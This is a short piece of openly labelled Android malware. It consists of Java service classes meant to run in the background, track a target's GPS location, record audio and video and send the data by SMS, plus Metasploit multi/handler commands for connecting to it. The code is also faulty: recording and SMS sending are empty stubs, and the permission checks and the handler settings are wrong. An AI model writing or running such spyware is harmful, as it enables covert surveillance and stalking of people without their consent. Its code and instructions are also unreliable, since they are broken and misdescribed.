This Malware service runs background and tracks the target's location, records audio and video, and sends the data through SMS.

sudo apt-get install metasploit-framework
msfconsole
Use the `exploit` module to connect to the malware:
Replace `127.0.0.1` with the IP address or hostname of the malware, and modify the port number
use exploit/multi/handler
set RHOST 127.0.0.1
set RPORT 443
run

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class MalwareService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        // Start the location tracking service
        startService(new Intent(this, LocationTrackerService.class));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}

import android.app.Service;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;

public class LocationTrackerService extends Service {

    private LocationManager locationManager;
    private TelephonyManager telephonyManager;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        // Start tracking location
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, this::onLocationChanged);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop tracking location
        locationManager.removeUpdates(this);
    }

    private void onLocationChanged(Location location) {
        // Get the device's location
        Log.i("Location", "Latitude: " + location.getLatitude() + " Longitude: " + location.getLongitude());

        // Get the device's audio recording permission status
        if (checkRecordingPermission()) {
            // Start recording audio
            startRecordingAudio();
        }

        // Get the device's video recording permission status
        if (checkVideoPermission()) {
            // Start recording video
            startRecordingVideo();
        }
    }

    private boolean checkRecordingPermission() {
        return (getApplicationContext().checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == android.os.Build.VERSION_CODES.MARSHMALLOW);
    }

    private void startRecordingAudio() {
        // Start recording audio
    }

    private boolean checkVideoPermission() {
        return (getApplicationContext().checkSelfPermission(android.Manifest.permission.CAMERA) == android.os.Build.VERSION_CODES.MARSHMALLOW);
    }

    private void startRecordingVideo() {
        // Start recording video
    }
}
